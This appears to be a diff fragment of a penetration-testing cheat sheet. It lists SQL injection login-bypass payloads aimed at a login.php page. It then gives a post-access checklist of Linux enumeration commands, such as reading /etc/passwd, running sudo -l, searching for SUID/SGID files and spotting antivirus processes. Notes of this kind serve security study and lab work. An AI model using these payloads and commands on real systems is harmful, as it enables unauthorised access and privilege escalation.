+   * http://localhost:11750/login.php?username=test%27OR%201=%271%20AND%20passwd=test%27OR%201=%271
+   * login.php?username=’&password=test' OR 1='1;
+
+
+Right when you gain access:
+   * Whoami
+   * Hostname
+   * Pwd
+   * Cat /etc/passwd
+   * Cat /etc/hosts
+   * Sudo -l
+   * Find / -type f -perm /(2)(4)(6)000 2>/dev/null
+   * Ps -elfH (Hierarchy) - Enumerate processes (Useful for finding antivirus)
+   * Chkconfig - Enumerate services
+   * Ifconfig -a / ip a - Enumerate network connection
+   * Arp -a / ip neigh - View possible previous connections
+   * SS -nltp - New netstat command
+   * Last - Who was last logged in
+   * Find /* -type d -iname “.*” - Find hidden directories
